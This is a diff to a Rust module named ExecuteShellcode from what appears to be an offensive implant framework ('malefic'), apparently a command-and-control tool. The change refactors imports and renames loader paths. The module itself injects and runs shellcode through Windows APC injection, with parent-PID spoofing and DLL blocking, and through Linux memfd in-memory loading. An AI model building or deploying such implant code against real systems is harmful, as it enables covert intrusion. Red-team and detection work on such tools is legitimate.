@@ -1,8 +1,10 @@
-use crate::{check_request, to_error, Module, Result, TaskResult};
+#![allow(unused_assignments)]
+use crate::{check_request, Module, Result, TaskResult};
 use async_trait::async_trait;
 use malefic_helper::common::format_cmdline;
-use malefic_helper::protobuf::implantpb::spite::Body;
-use malefic_helper::protobuf::implantpb::AssemblyResponse;
+use malefic_helper::to_error;
+use malefic_proto::proto::implantpb::spite::Body;
+use malefic_proto::proto::modulepb::BinaryResponse;
 use malefic_trait::module_impl;
 
 pub struct ExecuteShellcode {}
@@ -26,7 +28,7 @@ impl Module for ExecuteShellcode {
         let mut ppid = 0;
         let mut is_block_dll = false;
         let mut ret: Vec<u8> = Vec::new();
-        let par = format_cmdline(process_name, params);
+        let cmdline = format_cmdline(process_name, params);
         
         unsafe {
             if sacrifice.is_some() {
@@ -37,25 +39,26 @@ impl Module for ExecuteShellcode {
             }
             #[cfg(target_os = "windows")]
             {
-                ret = to_error!(malefic_helper::win::loader::apc::loader(
+                ret = to_error!(malefic_helper::win::inject::apc::loader(
                     bin,
                     is_need_sacrifice,
-                    par.as_ptr() as _,
+                    cmdline.as_ptr() as _,
                     ppid,
                     is_block_dll
                 ))?;
             }
             #[cfg(target_os = "linux")]
             {
-                ret = to_error!(malefic_helper::linux::loader::memfd::loader(
+                ret = to_error!(malefic_helper::linux::inject::memfd::loader(
                     bin,
                     request.output
                 ))?;
             }
         }
 
-        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(AssemblyResponse{
+        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
             status: 0,
+            message: Vec::new(),
             data: ret,
             err: "".to_string(),
         })))
